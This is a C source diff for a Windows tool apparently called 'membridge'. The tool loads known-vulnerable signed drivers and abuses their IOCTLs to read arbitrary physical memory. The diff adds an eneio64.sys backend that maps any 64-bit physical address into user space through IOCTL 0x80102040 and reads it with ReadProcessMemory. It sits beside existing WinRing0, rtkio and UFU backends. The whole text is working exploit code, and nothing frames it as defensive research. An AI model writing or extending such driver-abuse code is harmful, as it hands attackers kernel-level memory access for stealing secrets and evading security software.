@@ -24,7 +24,7 @@
 #include <stdlib.h>
 
 typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
-typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP } layout_t;
+typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP } layout_t;
 
 typedef struct {
     const wchar_t *id;
@@ -65,6 +65,9 @@ static const backend_t g_backends[] = {
     { L"rtkiow8x64", L"drivers\\rtkiow8x64\\rtkiow8x64.sys",
       BK_CONTROL, L"MembridgeRtkioW8", L"\\\\.\\rtkio", LY_RTKIO_MAP, 1,
       L"rtkiow8x64.sys (Realtek W8 variant; same IOCTL_PHYMEM_MAP 0x80002000, arbitrary 64-bit PA)" },
+    { L"eneio64", L"drivers\\eneio64\\eneio64.sys",
+      BK_CONTROL, L"MembridgeEneio", L"\\\\.\\GLCKIo", LY_ENEIO_MAP, 1,
+      L"eneio64.sys (ASUS/GIGABYTE ENE WinIO; IOCTL_WINIO_MAPPHYSTOLIN 0x80102040, arbitrary 64-bit PA)" },
     { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
       BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
       L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
@@ -95,6 +98,7 @@ static const char *layout_name(layout_t l) {
     case LY_WINRING0: return "winring0";
     case LY_HP_MAP: return "hp_swtools";
     case LY_RTKIO_MAP: return "rtkio";
+    case LY_ENEIO_MAP: return "eneio64";
     }
     return "?";
 }
@@ -483,6 +487,31 @@ static int read_rtkio_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) 
     return 1;
 }
 
+// eneio64 (WinIO-like): IOCTL_WINIO_MAPPHYSTOLIN 0x80102040.
+// input 40B: {u64 size; u64 physical_address; ...}; output linear address in result struct (+16/+24/+32 candidates).
+static int read_eneio_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
+    uint8_t in[40];
+    uint8_t res[40];
+    DWORD ret = 0;
+    memset(in, 0, sizeof(in));
+    memset(res, 0, sizeof(res));
+    *(uint64_t *)(in + 0) = size;
+    *(uint64_t *)(in + 8) = pa;
+    if (!DeviceIoControl(dev, 0x80102040u, in, sizeof(in), res, sizeof(res), &ret, NULL)) {
+        wprintf(L"[ERR] eneio64 IOCTL_WINIO_MAPPHYSTOLIN err=%lu\n", GetLastError());
+        return 0;
+    }
+    uint64_t cand[3] = { *(uint64_t *)(res + 24), *(uint64_t *)(res + 16), *(uint64_t *)(res + 32) };
+    for (int i = 0; i < 3; i++) {
+        if (cand[i] < 0x10000 || cand[i] > 0x7FFFFFFFFFFFull) continue;
+        SIZE_T got = 0;
+        if (ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)cand[i], out, size, &got) && got == size)
+            return 1;
+    }
+    wprintf(L"[ERR] eneio64 mapped linear address unusable\n");
+    return 0;
+}
+
 static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
     switch (ly) {
     case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
@@ -492,6 +521,7 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     case LY_WINRING0: return read_winring0(dev, pa, size, out);
     case LY_HP_MAP: return read_hp_map(dev, pa, size, out);
     case LY_RTKIO_MAP: return read_rtkio_map(dev, pa, size, out);
+    case LY_ENEIO_MAP: return read_eneio_map(dev, pa, size, out);
     }
     return 0;
 }
@@ -533,7 +563,7 @@ static void usage(void) {
     wprintf(L"  membridge --list\n");
     wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
     wprintf(L"               [--driver-path <path>] [--no-load]\n");
-    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio>\n");
+    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
     for (int i = 0; i < NBACKENDS; i++) {
@@ -582,6 +612,7 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(layout, L"winring0") == 0) g_manual_layout = LY_WINRING0;
         else if (_wcsicmp(layout, L"hp_swtools") == 0 || _wcsicmp(layout, L"hp_map") == 0) g_manual_layout = LY_HP_MAP;
         else if (_wcsicmp(layout, L"rtkio") == 0 || _wcsicmp(layout, L"rtkio_map") == 0) g_manual_layout = LY_RTKIO_MAP;
+        else if (_wcsicmp(layout, L"eneio64") == 0 || _wcsicmp(layout, L"eneio") == 0) g_manual_layout = LY_ENEIO_MAP;
         else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
     } else if (backend) {
         for (int i = 0; i < NBACKENDS; i++) {
